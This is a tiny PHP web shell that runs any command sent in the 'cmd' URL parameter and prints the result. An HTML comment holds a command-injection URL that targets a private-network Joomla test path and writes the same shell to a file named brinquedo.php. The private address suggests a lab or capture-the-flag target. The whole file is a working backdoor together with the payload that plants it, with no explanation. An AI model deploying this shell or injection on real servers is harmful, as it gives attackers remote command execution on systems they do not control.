<?php
if (isset($_GET['cmd'])) {
?>
	<pre> <?php print((shell_exec($_GET['cmd']))); ?> </pre>
<?php
}
?>

<!-- http://10.10.94.70/joomla/_test/index.php?plot=;id;echo%20%22%3C?phpif%20(isset($_GET[%27cmd%27]))%20{?%3E%3Cpre%3E%20%3C?php%20print((shell_exec($_GET[%27cmd%27])));%20?%3E%20%3C/pre%3E%3C?php}?%3E%22%20%3E%20brinquedo.php
